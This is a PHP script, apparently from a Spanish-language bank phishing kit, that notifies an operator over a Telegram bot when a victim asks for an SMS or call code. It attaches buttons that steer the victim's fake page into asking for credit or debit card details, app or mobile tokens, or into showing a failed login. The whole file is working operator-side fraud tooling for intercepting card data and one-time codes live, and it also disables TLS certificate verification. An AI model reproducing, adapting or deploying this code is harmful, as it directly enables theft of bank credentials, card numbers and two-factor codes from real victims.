<?php
// notify_sms.php — Notifica a Telegram cuando el usuario solicita/reenvía el código SMS

$config = require 'conexion.php';

$id = $_POST['id'] ?? '';
$tipo = $_POST['tipo'] ?? 'sms'; // 'sms' o 'llamada'

if (empty($id)) {
    echo json_encode(['ok' => false, 'error' => 'ID requerido']);
    exit;
}

$botToken = $config['telegram']['bot_token'];
$chatId = $config['telegram']['chat_id'];
$base_url = trim($config['base_url']);
$admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_url);
$es_local = (strpos($base_url, 'localhost') !== false);

if ($tipo === 'llamada') {
    $msg = "📞 *El usuario solicita el código por llamada*\n";
    $msg .= "› ID: `{$id}`\n";
    $msg .= "_Por favor, llama al cliente con el código._";
}
else {
    $msg = "💬 *Código SMS Solicitado*\n";
    $msg .= "› ID: `{$id}`\n";
    $msg .= "_El usuario presionó 'Enviar código'. Por favor, envía el SMS._";
}

$post_fields = [
    'chat_id' => $chatId,
    'text' => $msg,
    'parse_mode' => 'Markdown',
];

if (!$es_local && !empty($base_url)) {
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ TC Aprobada', 'url' => $base_url . '?id=' . $id . '&estado=11'],
            ],
            [
                ['text' => '❌ Error TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=12'],
                ['text' => '❌ Error TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=15'],
            ],
            [
                ['text' => '💳 Pedir TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=13'],
                ['text' => '🏦 Pedir TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=14'],
            ],
            [
                ['text' => '✅ Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=6'],
                ['text' => '❌ Error Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=7'],
            ],
            [
                ['text' => '❌ Login Fallido', 'url' => $base_url . '?id=' . $id . '&estado=1'],
                ['text' => '⚠️ Pedir Token App', 'url' => $base_url . '?id=' . $id . '&estado=2'],
            ],
            [
                ['text' => '❌ Rechazar', 'url' => $base_url . '?id=' . $id . '&estado=3'],
                ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $id],
            ],
            [
                ['text' => '🚫 Token Móvil Inválido', 'url' => $base_url . '?id=' . $id . '&estado=5']
            ]
        ]
    ];
    $post_fields['reply_markup'] = json_encode($keyboard);
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_exec($ch);
curl_close($ch);

echo json_encode(['ok' => true]);
